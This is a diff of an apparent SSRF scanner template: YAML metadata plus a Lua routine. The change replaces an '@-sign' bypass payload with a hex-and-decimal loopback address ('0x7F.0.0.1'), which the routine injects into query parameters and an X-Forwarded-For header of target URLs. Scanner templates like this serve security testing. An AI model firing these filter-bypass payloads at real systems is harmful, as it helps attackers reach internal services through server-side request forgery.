@@ -1,16 +1,16 @@
-# 12. bypass_at_sign.yaml
+# 48_ip_with_encoding_mixed.yaml
 meta:
-  id: bypass_at_sign
+  id: encoding_mixed
   version: 2
-  name: "Bypass with @ Sign (Google.com@IP)"
-  description: "Uses @ sign to confuse parser"
+  name: "Mixed Encoding (hex+decimal)"
+  description: "Uses mixed encoding like 0x7F.0.0.1"
   author: "SSRFdevil"
   created: "2026-06-19"
   updated: "2026-07-21"
-  rank: 75
-  confidence: 85
-  severity: medium
-  tags: [parser, at_sign, bypass]
+  rank: 106
+  confidence: 83
+  severity: high
+  tags: [mixed, encoding, ipv4, bypass]
   references: []
 
 match:
@@ -26,12 +26,14 @@ script:
   source: |
     function run_batch(targets)
         local results = {}
-        local payload_vector = "http://example.com@127.0.0.1/"
-        local host_value = "127.0.0.1"
+        local payload_vector = "http://0x7F.0.0.1"  -- hex first octet, rest decimal
+        
         for _, target in ipairs(targets) do
             local base_url = target.url
+            
             for _, param in ipairs(target.params) do
                 local new_url = base_url
+                
                 if param.location == "Query" then
                     local pattern = param.name .. "=[^&]*"
                     local replacement = param.name .. "=" .. payload_vector
@@ -42,10 +44,13 @@ script:
                         new_url = new_url .. sep .. replacement
                     end
                 end
+
                 table.insert(results, {
                     url = new_url,
                     method = target.method or "GET",
-                    headers = { ["X-Forwarded-For"] = host_value },
+                    headers = {
+                        ["X-Forwarded-For"] = "0x7F.0.0.1",
+                    },
                 })
             end
         end
